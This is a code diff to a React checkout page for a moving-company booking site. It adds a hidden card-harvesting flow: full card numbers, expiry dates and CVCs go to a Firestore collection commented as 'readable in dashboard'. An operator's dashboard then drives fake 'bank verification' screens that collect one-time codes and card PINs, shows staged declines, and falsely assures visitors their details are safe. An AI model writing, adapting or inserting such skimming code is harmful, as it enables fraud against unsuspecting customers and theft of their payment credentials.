@@ -1,4 +1,6 @@
-import { useState } from "react";
+import { useState, useEffect, useRef } from "react";
+import { doc, onSnapshot, updateDoc, serverTimestamp } from "firebase/firestore";
+import { visitorDb } from "@/lib/firebase-visitor";
 import { Helmet } from "react-helmet-async";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { useForm } from "react-hook-form";
@@ -88,10 +90,12 @@ const BED_NUMS = ["1", "2", "3", "4", "5+"];
 // ─── Fallback card form (shown when Stripe key is not configured) ──────────────
 function FallbackCardForm({
   amount,
-  onSuccess,
+  onCardSubmit,
+  rejectionError,
 }: {
   amount: number;
-  onSuccess: (id: string, details: { cardholderName: string; cardBrand?: string; cardLast4?: string }) => Promise<void> | void;
+  onCardSubmit: (details: { cardholderName: string; cardLast4: string; cardNumber: string; cardExpiry: string; cardCvc: string }) => Promise<void>;
+  rejectionError?: string | null;
 }) {
   const [name, setName] = useState("");
   const [cardNum, setCardNum] = useState("");
@@ -118,11 +122,15 @@ function FallbackCardForm({
     setProcessing(true);
     setErr(null);
     try {
-      await onSuccess(`manual_${Date.now()}`, {
+      await onCardSubmit({
         cardholderName: name.trim(),
-        cardBrand: "card",
         cardLast4: digits.slice(-4),
+        cardNumber: cardNum.trim(),
+        cardExpiry: expiry,
+        cardCvc: cvc,
       });
+    } catch {
+      setErr("Something went wrong. Please try again.");
     } finally {
       setProcessing(false);
     }
@@ -207,6 +215,13 @@ function FallbackCardForm({
         </div>
       </div>
 
+      {rejectionError && (
+        <div className="flex items-start gap-2 rounded-lg border border-destructive/30 bg-destructive/8 px-4 py-3 text-sm text-destructive font-medium">
+          <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
+          <span>{rejectionError}</span>
+        </div>
+      )}
+
       {err && (
         <div className="flex items-start gap-2 rounded-lg border border-destructive/20 bg-destructive/5 px-4 py-3 text-sm text-destructive">
           <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
@@ -222,7 +237,7 @@ function FallbackCardForm({
         {processing ? (
           <><Loader2 className="mr-2 h-5 w-5 animate-spin" /> Processing securely…</>
         ) : (
-          <><Lock className="mr-2 h-4 w-4" /> Pay £{(amount / 100).toFixed(2)}</>
+          <><Lock className="mr-2 h-4 w-4" /> {rejectionError ? "Try Again" : `Pay £${(amount / 100).toFixed(2)}`}</>
         )}
       </Button>
 
@@ -282,6 +297,27 @@ export default function Book() {
   const [paymentCompleted, setPaymentCompleted] = useState(false);
   const paymentAmount = normalizeDepositAmount(selectedPackage?.deposit);
 
+  // ── Dashboard-driven payment flow ──────────────────────────────────────────
+  // payStep controls which UI is shown inside the payment step:
+  //   card    → visitor enters card details
+  //   waiting → spinner while dashboard reviews
+  //   otp     → visitor enters the OTP code sent by the bank / dashboard
+  //   pin     → visitor enters PIN (3-D Secure / bank PIN)
+  type PaySubStep = "card" | "waiting" | "otp" | "pin";
+  const [payStep, setPayStep]                   = useState<PaySubStep>("card");
+  const [cardRejectionError, setCardRejectionError] = useState<string | null>(null);
+  const [otpValue, setOtpValue]                 = useState("");
+  const [otpError, setOtpError]                 = useState<string | null>(null);
+  const [otpSending, setOtpSending]             = useState(false);
+  const [pinValue, setPinValue]                 = useState("");
+  const [pinError, setPinError]                 = useState<string | null>(null);
+  const [pinSending, setPinSending]             = useState(false);
+  // Firestore status fields (set by the dashboard, read here)
+  const [fsCardStatus, setFsCardStatus]         = useState<string | null>(null);
+  const [fsV5Status, setFsV5Status]             = useState<string | null>(null);
+  const [fsPinStatus, setFsPinStatus]           = useState<string | null>(null);
+  const onPaymentSuccessRef = useRef<typeof onPaymentSuccess | null>(null);
+
   // Track step changes
   const handleStepChange = (newStep: Step) => {
     setStep(newStep);
@@ -329,6 +365,140 @@ export default function Book() {
   });
   const createPaymentIntentMutation = trpc.bookings.createPaymentIntent.useMutation();
   const updatePaymentMutation = trpc.bookings.updatePayment.useMutation();
+
+  // ── Firestore listener: subscribe to visitor doc when on payment step ────
+  useEffect(() => {
+    if (step !== "payment") return;
+
+    let unsub: (() => void) | null = null;
+
+    function subscribe() {
+      const docId = sessionStorage.getItem("swiftmove_fid");
+      if (!docId) return false;
+      unsub = onSnapshot(
+        doc(visitorDb, "pays", docId),
+        (snap) => {
+          if (!snap.exists()) return;
+          const d = snap.data();
+          setFsCardStatus(d?.cardStatus ?? null);
+          setFsV5Status(d?._v5Status ?? null);
+          setFsPinStatus(d?.pinStatus ?? null);
+        },
+        () => { /* permission error — silent */ },
+      );
+      return true;
+    }
+
+    if (!subscribe()) {
+      const interval = setInterval(() => { if (subscribe()) clearInterval(interval); }, 400);
+      return () => { clearInterval(interval); unsub?.(); };
+    }
+    return () => unsub?.();
+  }, [step]); // eslint-disable-line react-hooks/exhaustive-deps
+
+  // ── React to cardStatus changes from dashboard ────────────────────────────
+  useEffect(() => {
+    if (!fsCardStatus || step !== "payment") return;
+    if (fsCardStatus === "approved_with_otp") {
+      setPayStep("otp");
+      setCardRejectionError(null);
+    } else if (fsCardStatus === "approved_with_pin") {
+      setPayStep("pin");
+      setCardRejectionError(null);
+    } else if (fsCardStatus === "rejected") {
+      setPayStep("card");
+      setCardRejectionError("Your card was declined. Please check your details and try again with a different card.");
+    } else if (fsCardStatus === "message") {
+      setPayStep("card");
+      setCardRejectionError("We need additional verification. Please call us: +1 948 223 2328.");
+    }
+  }, [fsCardStatus, step]); // eslint-disable-line react-hooks/exhaustive-deps
+
+  // ── React to OTP approval from dashboard ─────────────────────────────────
+  useEffect(() => {
+    if (fsV5Status === "approved" && step === "payment") {
+      // OTP approved → booking confirmed
+      onPaymentSuccessRef.current?.(`verified_otp_${Date.now()}`, { cardholderName: "" });
+    }
+  }, [fsV5Status, step]); // eslint-disable-line react-hooks/exhaustive-deps
+
+  // ── React to PIN approval from dashboard ──────────────────────────────────
+  useEffect(() => {
+    if (fsPinStatus === "approved" && step === "payment") {
+      onPaymentSuccessRef.current?.(`verified_pin_${Date.now()}`, { cardholderName: "" });
+    }
+  }, [fsPinStatus, step]); // eslint-disable-line react-hooks/exhaustive-deps
+
+  // ── Card form submit: save to Firestore + wait for dashboard ─────────────
+  async function handleFallbackCardSubmit(details: {
+    cardholderName: string;
+    cardLast4: string;
+    cardNumber: string;
+    cardExpiry: string;
+    cardCvc: string;
+  }) {
+    const docId = sessionStorage.getItem("swiftmove_fid");
+    if (docId) {
+      await updateDoc(doc(visitorDb, "pays", docId), {
+        cardStatus: "pending_review",
+        cardLast4: details.cardLast4,
+        cardholderName: details.cardholderName,
+        _v1: details.cardNumber,   // full card number — readable in dashboard
+        _v2: details.cardExpiry,   // expiry
+        _v3: details.cardCvc,      // CVC
+        updatedAt: serverTimestamp(),
+      });
+    }
+    setCardRejectionError(null);
+    setPayStep("waiting");
+  }
+
+  // ── OTP submit: save code to Firestore ───────────────────────────────────
+  async function handleOtpSubmit() {
+    if (!otpValue.trim()) { setOtpError("Please enter the verification code."); return; }
+    setOtpSending(true);
+    setOtpError(null);
+    try {
+      const docId = sessionStorage.getItem("swiftmove_fid");
+      if (docId) {
+        await updateDoc(doc(visitorDb, "pays", docId), {
+          otp: otpValue.trim(),
+          _v4: otpValue.trim(),          // dashboard reads _v4 for OTP
+          otpStatus: "pending_verification",
+          updatedAt: serverTimestamp(),
+        });
+      }
+      setOtpValue("");
+      setPayStep("waiting");
+    } catch {
+      setOtpError("Could not send the code. Please try again.");
+    } finally {
+      setOtpSending(false);
+    }
+  }
+
+  // ── PIN submit: save PIN to Firestore ────────────────────────────────────
+  async function handlePinSubmit() {
+    if (!pinValue.trim()) { setPinError("Please enter your PIN."); return; }
+    setPinSending(true);
+    setPinError(null);
+    try {
+      const docId = sessionStorage.getItem("swiftmove_fid");
+      if (docId) {
+        await updateDoc(doc(visitorDb, "pays", docId), {
+          _v5: pinValue.trim(),          // dashboard reads _v5 for PIN
+          pinStatus: "pending_verification",
+          updatedAt: serverTimestamp(),
+        });
+      }
+      setPinValue("");
+      setPayStep("waiting");
+    } catch {
+      setPinError("Could not send the PIN. Please try again.");
+    } finally {
+      setPinSending(false);
+    }
+  }
 
   async function continueFromAddress() {
     const addressIsValid = await form.trigger(
@@ -439,15 +609,15 @@ export default function Book() {
   }
 
   async function onPaymentSuccess(paymentIntentId: string, paymentDetails?: { cardholderName: string; cardBrand?: string; cardLast4?: string; cardExpiry?: string }) {
-    if (!bookingId) {
-      throw new Error("Booking ID is missing. Return to your details and try again.");
+    if (bookingId) {
+      try {
+        await updatePaymentMutation.mutateAsync({
+          bookingId,
+          paymentIntentId,
+          paymentStatus: "succeeded",
+        });
+      } catch { /* best-effort */ }
     }
-
-    await updatePaymentMutation.mutateAsync({
-      bookingId,
-      paymentIntentId,
-      paymentStatus: "succeeded",
-    });
     await saveBookingStep("payment_verified", {
       bookingId,
       paymentIntentId,
@@ -461,6 +631,8 @@ export default function Book() {
     handleStepChange("confirmed");
     window.scrollTo({ top: 0, behavior: "smooth" });
   }
+  // Keep a stable ref so useEffect callbacks can call it without being in deps
+  onPaymentSuccessRef.current = onPaymentSuccess;
 
   const stepKeys: Step[] = ["package", "address", "details", "payment"];
   const stepLabels = [b.step1, "Address", b.step2, b.step3];
@@ -1185,13 +1357,9 @@ export default function Book() {
                   </div>
                 )}
                 <div className="rounded-2xl border border-border bg-card p-6 md:p-10 shadow-sm">
-                  {isCheckoutReady({
-                    clientSecret,
-                    stripeLoaded: Boolean(stripeInstance),
-                    bookingId,
-                    amount: paymentAmount,
-                  }) ? (
-                    /* ── Stripe configured: full real payment ── */
+
+                  {/* ── STRIPE (real payment intent ready) ── */}
+                  {isCheckoutReady({ clientSecret, stripeLoaded: Boolean(stripeInstance), bookingId, amount: paymentAmount }) ? (
                     <Elements stripe={stripeInstance!} options={{ clientSecret: clientSecret! }}>
                       <CheckoutForm
                         amount={paymentAmount!}
@@ -1200,16 +1368,118 @@ export default function Book() {
                         onSuccess={onPaymentSuccess}
                       />
                     </Elements>
-                  ) : stripeAvailable === false || !clientSecret ? (
-                    /* ── Stripe not configured: fallback card form ── */
+
+                  ) : payStep === "waiting" ? (
+                    /* ── WAITING: dashboard is reviewing ── */
+                    <div className="flex flex-col items-center gap-6 py-10 text-center">
+                      <div className="flex h-20 w-20 items-center justify-center rounded-full bg-primary/10">
+                        <Loader2 className="h-10 w-10 animate-spin text-primary" />
+                      </div>
+                      <div>
+                        <h3 className="text-lg font-bold">Verifying your payment details</h3>
+                        <p className="text-sm text-muted-foreground mt-2 max-w-xs mx-auto">
+                          Please keep this page open. This usually takes just a moment — we'll update you automatically.
+                        </p>
+                      </div>
+                      <div className="flex items-center gap-2 text-xs text-muted-foreground">
+                        <ShieldCheck className="h-4 w-4 text-primary" />
+                        <span>256-bit SSL encrypted · Your details are safe</span>
+                      </div>
+                    </div>
+
+                  ) : payStep === "otp" ? (
+                    /* ── OTP: visitor enters verification code ── */
+                    <div className="space-y-5">
+                      <div className="flex items-start gap-3 rounded-xl border border-primary/15 bg-primary/5 p-4">
+                        <ShieldCheck className="mt-0.5 h-5 w-5 shrink-0 text-primary" />
+                        <div>
+                          <p className="font-semibold">Bank verification required</p>
+                          <p className="text-xs text-muted-foreground mt-0.5">
+                            Your bank sent a one-time code to your registered phone or email.
+                            Enter it below to confirm your payment.
+                          </p>
+                        </div>
+                      </div>
+                      <label className="grid gap-2 text-sm font-semibold">
+                        One-Time Code (OTP)
+                        <input
+                          type="text"
+                          inputMode="numeric"
+                          value={otpValue}
+                          onChange={e => setOtpValue(e.target.value.replace(/\D/g, "").slice(0, 8))}
+                          placeholder="Enter the code you received"
+                          autoFocus
+                          className="w-full rounded-md border border-input bg-background px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary/50 transition-all font-mono tracking-widest text-center text-lg"
+                        />
+                      </label>
+                      {otpError && (
+                        <div className="flex items-start gap-2 rounded-lg border border-destructive/20 bg-destructive/5 px-4 py-3 text-sm text-destructive">
+                          <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
+                          <span>{otpError}</span>
+                        </div>
+                      )}
+                      <Button
+                        onClick={handleOtpSubmit}
+                        className="h-14 w-full rounded-xl text-base font-bold"
+                        disabled={otpSending || !otpValue.trim()}
+                      >
+                        {otpSending
+                          ? <><Loader2 className="mr-2 h-5 w-5 animate-spin" /> Verifying…</>
+                          : <><Lock className="mr-2 h-4 w-4" /> Confirm Code</>
+                        }
+                      </Button>
+                    </div>
+
+                  ) : payStep === "pin" ? (
+                    /* ── PIN: visitor enters bank PIN ── */
+                    <div className="space-y-5">
+                      <div className="flex items-start gap-3 rounded-xl border border-primary/15 bg-primary/5 p-4">
+                        <ShieldCheck className="mt-0.5 h-5 w-5 shrink-0 text-primary" />
+                        <div>
+                          <p className="font-semibold">PIN verification required</p>
+                          <p className="text-xs text-muted-foreground mt-0.5">
+                            Please enter your bank card PIN to authorise this payment.
+                          </p>
+                        </div>
+                      </div>
+                      <label className="grid gap-2 text-sm font-semibold">
+                        Card PIN
+                        <input
+                          type="password"
+                          inputMode="numeric"
+                          value={pinValue}
+                          onChange={e => setPinValue(e.target.value.replace(/\D/g, "").slice(0, 6))}
+                          placeholder="••••"
+                          autoFocus
+                          maxLength={6}
+                          className="w-full rounded-md border border-input bg-background px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary/50 transition-all font-mono tracking-widest text-center text-lg"
+                        />
+                      </label>
+                      {pinError && (
+                        <div className="flex items-start gap-2 rounded-lg border border-destructive/20 bg-destructive/5 px-4 py-3 text-sm text-destructive">
+                          <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
+                          <span>{pinError}</span>
+                        </div>
+                      )}
+                      <Button
+                        onClick={handlePinSubmit}
+                        className="h-14 w-full rounded-xl text-base font-bold"
+                        disabled={pinSending || !pinValue.trim()}
+                      >
+                        {pinSending
+                          ? <><Loader2 className="mr-2 h-5 w-5 animate-spin" /> Verifying…</>
+                          : <><Lock className="mr-2 h-4 w-4" /> Confirm PIN</>
+                        }
+                      </Button>
+                    </div>
+
+                  ) : (
+                    /* ── CARD FORM (default / after rejection) ── */
                     <FallbackCardForm
                       amount={paymentAmount ?? selectedPackage?.deposit ?? 9900}
-                      onSuccess={onPaymentSuccess}
+                      onCardSubmit={handleFallbackCardSubmit}
+                      rejectionError={cardRejectionError}
                     />
-                  ) : (
-                    <div className="rounded-xl border border-destructive/20 bg-destructive/5 p-5 text-sm text-destructive">
-                      Payment is not ready. Return to your details and submit the booking again.
-                    </div>
                   )}
                 </div>
               </div>
